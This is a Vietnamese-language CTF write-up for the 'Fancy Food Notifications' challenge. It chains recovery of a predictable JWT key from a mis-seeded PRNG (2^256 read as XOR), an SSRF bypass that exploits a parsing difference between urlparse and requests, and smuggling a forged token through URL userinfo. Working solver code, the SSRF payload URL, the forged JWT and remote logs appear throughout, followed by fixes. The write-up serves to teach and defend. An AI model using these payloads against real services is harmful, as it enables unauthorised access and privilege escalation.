# Fancy Food Notifications — Write-up

## 1. Tóm tắt

Challenge này là một chain gồm **2 lỗi ghép lại**:

1. **JWT key có thể dự đoán được** vì ứng dụng seed `random` sai:
   ```python
   secrets.randbelow(2^256)
   ```
   Trong Python, `^` là XOR chứ không phải lũy thừa. Vì vậy:
   ```python
   2^256 == 258
   ```
   => seed chỉ có **258 khả năng**.

2. Có thể **SSRF vào `/vip-meal` từ localhost** nhờ parser mismatch giữa `urlparse()` và `requests`, đồng thời nhét **JWT giả mạo** vào phần `userinfo` của URL để nó đi vào header `Authorization` mà `/vip-meal` đọc.

Khai thác hoàn chỉnh:
- Gửi 1 order đầu tiên để lấy `notification id` đầu tiên.
- Từ `id` đó brute-force seed `n ∈ [0,257]`.
- Tái tạo `key = random.randbytes(32).hex()`.
- Forge JWT VIP.
- Gửi order thứ hai với URL SSRF:
  ```text
  http://<raw_jwt>:@127.0.0.1\@1.1.1.1/../vip-meal
  ```
- App backend sẽ connect tới `127.0.0.1`, truy cập `/vip-meal` với token VIP giả mạo.
- Notification trả về HTML chứa flag.

Flag remote đã lấy được:
```text
GPNCTF{and_a5_aLWAyS_TH3_pRoB1Em_WaS_Dn5}
```

---

## 2. Phân tích source

### 2.1. Seed PRNG sai

Đầu file:

```python
random.seed(f"...{secrets.randbelow(2^256)}...")
```

Nhiều người đọc lướt sẽ tưởng là `2**256`, nhưng thực tế là XOR:

```python
>>> 2 ^ 256
258
```

Nghĩa là giá trị ngẫu nhiên được chèn vào seed string chỉ nằm trong tập:

```python
0..257
```

Ngay sau đó ứng dụng dùng `random` để sinh key JWT:

```python
key = str(random.randbytes(32).hex())
```

và sinh notification id:

```python
def randomId():
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
```

Vì **key** và **notification id** đều cùng lấy từ **cùng một PRNG state**, chỉ cần nhìn thấy notification id đầu tiên là có thể brute-force lại seed và khôi phục key.

---

### 2.2. Cách `/order` và `/notification/<id>` hoạt động

Khi gọi `/order`, app tạo id rồi spawn thread:

```python
id = randomId()
...
t = threading.Thread(target=create_meal, args=(id,url,), daemon=True)
```

Phản hồi HTML có đường dẫn dạng:

```html
<a href="/notification/<id>"><id></a>
```

=> Chỉ cần gửi request đầu tiên là ta học được **id đầu tiên sau khi instance reset**.

Do server có endpoint:

```python
@app.route('/shutdown')
def shutdown():
    os._exit(0)
```

nên có thể reset instance để bảo đảm PRNG state luôn bắt đầu từ đầu, giúp việc brute-force ổn định hơn.

---

### 2.3. `/vip-meal` chỉ cho localhost, nhưng xác thực bằng JWT

```python
@app.route('/vip-meal')
def vip_meal():
    if request.remote_addr != "127.0.0.1":
        ... 401
```

Chỉ request đến từ localhost mới được vào.

Sau đó server lấy `Authorization`:

```python
token = str(request.headers.get("Authorization", default="")).split(" ")[-1]
```

Nếu header là:

```text
Authorization: Bearer <base64(jwt)>
```

thì `.split(" ")[-1]` lấy phần cuối, tức `<base64(jwt)>`.

Tiếp đó:

```python
token = base64.b64decode(token).decode()
token = ''.join(c for c in token if c.isalnum() or c in ['.', '=', '-', '_'])
```

rồi verify:

```python
decoded = jwt.decode(token, key, algorithms=["HS256"])
if (not decoded.get("vip", False)):
    ... 403
```

=> Muốn lấy flag cần:
1. Request phải tới từ `127.0.0.1`.
2. Token phải là JWT hợp lệ với `vip=True`.

---

## 3. Khôi phục key từ notification id đầu tiên

Sau khi reset instance, gửi order đầu tiên.

Server gốc trả về:

```text
[1] notification id=uz3k8s1jfp
```

Ta mô phỏng lại quá trình khởi tạo cho từng `n` từ `0` đến `257`:

```python
for n in range(258):
    rnd = random.Random()
    rnd.seed(f"...{n}...")
    candidate_key = rnd.randbytes(32).hex()
    candidate_id = ''.join(rnd.choices(ALPHABET, k=10))
    if candidate_id == observed_id:
        return n, candidate_key
```

Log remote đã match:

```text
[2] matched seed randbelow value n=28
[2] derived HS256 key=7e6b3eab5b81f4f92d577e2066a7dc38fa578ba0acf540750ece923c18262c6b
```

Đây là điểm quan trọng nhất của bài: **seed space cực nhỏ** nên key JWT không còn bí mật.

---

## 4. Forge JWT VIP

JWT bình thường app sinh cho user như sau:

```python
def generateToken(id):
    token = jwt.encode({"vip": False, "id": id}, key, algorithm="HS256")
    token = base64.b64encode(token.encode()).decode()
    return token
```

Ta đã biết `key`, nên chỉ cần forge token mới:

```python
raw_jwt = jwt.encode({"vip": True, "id": "chef"}, key, algorithm="HS256")
outer = base64.b64encode(raw_jwt.encode()).decode()
```

Remote log:

```text
[3] forged VIP raw JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ2aXAiOnRydWUsImlkIjoiY2hlZiJ9.4UAEbsLpopLPhc1iKk0KUB4JZHHlulFwFKGSKzqj-Qs
[3] local verification of forged JWT={'vip': True, 'id': 'chef'}
```

`outer` là dạng base64 ngoài cùng, đúng format mà `/vip-meal` mong đợi khi decode `Authorization`.

---

## 5. Phân tích SSRF bypass

### 5.1. Filter phía app

Trong `create_meal()`:

```python
addresses = socket.getaddrinfo(urlparse(url).hostname, 0)
...
if (not ipaddress.ip_address(addr[4][0]).is_global):
    ... REJECTED
```

Ý tưởng của tác giả là:
- Parse hostname từ URL.
- Resolve DNS.
- Nếu IP không phải global thì chặn.

Nghe có vẻ đúng, nhưng vấn đề là:
- **Hostname được check bởi `urlparse()`**
- **URL thực tế được request bởi `requests.get()`**

Hai parser này không xử lý các URL dị dạng giống nhau.

---

### 5.2. Payload bypass

Payload exploit:

```text
http://<raw_jwt>:@127.0.0.1\@1.1.1.1/../vip-meal
```

Ví dụ cụ thể từ log:

```text
http://eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ2aXAiOnRydWUsImlkIjoiY2hlZiJ9.4UAEbsLpopLPhc1iKk0KUB4JZHHlulFwFKGSKzqj-Qs:@127.0.0.1\@1.1.1.1/../vip-meal
```

### 5.3. Tại sao filter bị qua mặt?

`urlparse()` nhìn URL này và coi hostname là phần sau `@` cuối cùng, tức:

```text
1.1.1.1
```

`1.1.1.1` là IP global => pass check.

Remote log xác nhận điều đó:

```text
Resolved 1.1.1.1
```

### 5.4. Tại sao request thực lại đi vào localhost?

`requests` / `urllib3` lại xử lý URL khác, coi đích kết nối là:

```text
127.0.0.1
```

và phần path được normalize thành:

```text
/vip-meal
```

Tức là backend tự gọi vào chính nó qua localhost.

=> Bypass hoàn chỉnh điều kiện:

```python
if request.remote_addr != "127.0.0.1"
```

---

## 6. Nhét JWT vào `Authorization` bằng userinfo trong URL

Backend khi notify luôn tự thêm header:

```python
headers={"Authorization": f"Bearer {generateToken(id)}"}
```

Nếu chỉ có vậy thì ta chỉ nhận được token `vip=False`.

Nhưng URL của ta có dạng:

```text
http://<raw_jwt>:@127.0.0.1...
```

Phần trước `@` chính là **userinfo**:

```text
<username>:<password>
```

Trong trường hợp này:
- username = `<raw_jwt>`
- password = rỗng

Khi `requests` gửi request với URL chứa userinfo, thư viện tự sinh **Basic Authorization** tương ứng. Vì password rỗng, giá trị Basic sẽ encode chuỗi:

```text
<raw_jwt>:
```

Đến phía `/vip-meal`, code lấy:

```python
token = str(request.headers.get("Authorization", default="")).split(" ")[-1]
```

Nếu header thực nhận là dạng Basic, phần cuối sẽ là base64 của `<raw_jwt>:`.

Sau đó app decode base64:

```python
token = base64.b64decode(token).decode()
```

thu được:

```text
<raw_jwt>:
```

rồi lọc ký tự:

```python
token = ''.join(c for c in token if c.isalnum() or c in ['.', '=', '-', '_'])
```

Dấu `:` bị loại bỏ, còn lại chính xác là:

```text
<raw_jwt>
```

Vậy là token VIP giả mạo của ta được đưa vào `jwt.decode()` một cách hợp lệ.

Đây là chi tiết rất hay của challenge: **không cần trực tiếp điều khiển header**, chỉ cần lợi dụng cách `requests` encode userinfo + cách server decode Authorization quá lỏng lẻo.

---

## 7. Khai thác hoàn chỉnh

### Bước 1: reset instance

```text
[reset] shutdown request ended as expected: ConnectionError: ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))
[reset] instance is up after 2 probe(s)
```

Mục đích: đưa PRNG về trạng thái đầu.

---

### Bước 2: gửi order đầu tiên để lấy notification id đầu tiên

```text
[1] requesting first order to learn PRNG state/key from first notification id
[1] /order status=200
[1] notification id=uz3k8s1jfp
```

---

### Bước 3: brute-force seed và khôi phục key

```text
[2] matched seed randbelow value n=28
[2] derived HS256 key=7e6b3eab5b81f4f92d577e2066a7dc38fa578ba0acf540750ece923c18262c6b
```

---

### Bước 4: forge VIP JWT

```text
[3] forged VIP raw JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ2aXAiOnRydWUsImlkIjoiY2hlZiJ9.4UAEbsLpopLPhc1iKk0KUB4JZHHlulFwFKGSKzqj-Qs
[3] local verification of forged JWT={'vip': True, 'id': 'chef'}
```

---

### Bước 5: chờ qua rate limit

`/order` bị rate limit 20 giây:

```python
rate_limit = 20
```

Remote log:

```text
[4] waiting 20.5s for /order rate limit
```

---

### Bước 6: gửi order exploit với URL SSRF

```text
[5] exploit notification URL=http://<raw_jwt>:@127.0.0.1\@1.1.1.1/../vip-meal
[5] /order status=200
[5] exploit notification id=w356rcqgh3
```

---

### Bước 7: poll notification cho đến khi DONE

```text
[6] polling notification result
    poll 0: status=COOKING
    poll 7: status=DONE
```

Notification cuối cùng chứa nguyên HTML từ `/vip-meal`.

---

## 8. Bằng chứng flag thật

Log remote cuối cùng:

```text
[7] final notification JSON:
{'id': 'w356rcqgh3', 'message': '<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>VIP Meal</title>\n    <link rel="stylesheet" href="/static/css/style.css">\n</head>\n<body>\n    <header>\n        <h1>VIP Meal</h1>\n    </header>\n    <main>\n        <p>Our chef cooked the beast meal for our vip customers, here is the flag GPNCTF{and_a5_aLWAyS_TH3_pRoB1Em_WaS_Dn5} with some caviar on top.</p>\n        <a href="/">Back to Home</a>\n    </main>\n</body>\n</html>', 'status': 'DONE'}
[FLAG] GPNCTF{and_a5_aLWAyS_TH3_pRoB1Em_WaS_Dn5}
```

Đây là **minh chứng flag thật**, vì:
- Nội dung đến trực tiếp từ endpoint `/vip-meal` của server gốc.
- HTML trả về đúng template VIP Meal của ứng dụng.
- Flag nằm trong response body sinh bởi server sau khi xác thực `vip=True` và `remote_addr == 127.0.0.1`.

Flag chính xác là:

```text
GPNCTF{and_a5_aLWAyS_TH3_pRoB1Em_WaS_Dn5}
```

---

## 9. Solver mẫu

Ý tưởng code:

```python
# 1. reset instance
# 2. /order lần 1 -> lấy id đầu tiên
# 3. brute-force n in range(258)
# 4. derive key
# 5. forge JWT vip=True
# 6. sleep qua rate limit
# 7. /order lần 2 với SSRF URL
# 8. poll /notification/<id>
# 9. regex lấy flag
```

Phần brute-force cốt lõi:

```python
def recover_key_from_first_id(first_id):
    alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789'
    for n in range(258):
        rnd = random.Random()
        rnd.seed(f"VG8g...{n}...QzYyNTg4Q0NEMjYzMUVEQ0YyMkU4Q0NDMUZCMzVCNTAxQzlDODY=")
        key = rnd.randbytes(32).hex()
        cand = ''.join(rnd.choices(alphabet, k=10))
        if cand == first_id:
            return n, key
    raise RuntimeError("seed not found")
```

Phần payload:

```python
raw_jwt = jwt.encode({"vip": True, "id": "chef"}, key, algorithm="HS256")
url = f"http://{raw_jwt}:@127.0.0.1\\@1.1.1.1/../vip-meal"
```

---

## 10. Vì sao bài này hay?

Đây không phải một bug đơn lẻ mà là **bug chain**:

- **Crypto misuse / predictable secret**
  - Seed sai vì nhầm `^` với `**`
  - Dẫn đến JWT key dự đoán được

- **SSRF parser differential**
  - App check hostname bằng `urlparse()`
  - Nhưng request thực hiện bằng `requests`
  - Hai parser hiểu URL khác nhau

- **Header smuggling qua userinfo / Basic Auth**
  - Không cần trực tiếp set Authorization
  - Chỉ cần khiến client tự sinh Basic header
  - Server lại decode quá dễ dãi

- **Privilege escalation**
  - JWT `vip=False` → forge thành `vip=True`

Chain này rất thực tế vì từng phần riêng lẻ nhìn qua có vẻ “không nghiêm trọng lắm”, nhưng ghép lại thì ra full compromise.

---

## 11. Cách fix

### Fix 1: dùng đúng toán tử lũy thừa

```python
secrets.randbelow(2**256)
```

Nhưng tốt hơn nữa là **không seed `random` để sinh secret**.

---

### Fix 2: secret phải lấy từ `secrets`

Không dùng `random.randbytes(32)` cho JWT key.

Nên dùng:

```python
import secrets
key = secrets.token_hex(32)
```

---

### Fix 3: không tự viết SSRF filter kiểu parse rồi resolve

Nếu thật sự phải fetch URL do user cung cấp:
- Chỉ cho phép `http` / `https`
- Parse bằng đúng cùng thư viện/network stack sẽ dùng để request
- Resolve toàn bộ redirect chain
- Chặn private IP, loopback, link-local, unix socket, IPv6 local, DNS rebinding
- Hoặc tốt nhất: **không fetch URL tùy ý từ backend**

---

### Fix 4: không lấy auth token từ Basic/userinfo một cách mơ hồ

Không nên làm:

```python
token = str(request.headers.get("Authorization", default="")).split(" ")[-1]
```

Nên check chặt:
- Bắt buộc đúng scheme `Bearer`
- Parse đúng format
- Không base64 decode mù quáng mọi loại Authorization

Ví dụ:

```python
auth = request.headers.get("Authorization", "")
if not auth.startswith("Bearer "):
    abort(401)
token = auth[len("Bearer "):]
```

---

## 12. Kết luận

Challenge được solve bằng chain sau:

1. Reset instance.
2. Lấy notification id đầu tiên.
3. Brute-force seed vì `2^256` chỉ ra 258 khả năng.
4. Recover JWT signing key.
5. Forge JWT với `vip=True`.
6. Dùng parser mismatch để SSRF vào `127.0.0.1/vip-meal` trong khi filter chỉ thấy `1.1.1.1`.
7. Nhét JWT vào userinfo để `requests` tạo Basic Auth, rồi tận dụng logic decode lỏng lẻo của server để biến nó thành token hợp lệ.
8. Đọc HTML response chứa flag.

Flag cuối cùng:

```text
GPNCTF{and_a5_aLWAyS_TH3_pRoB1Em_WaS_Dn5}
```
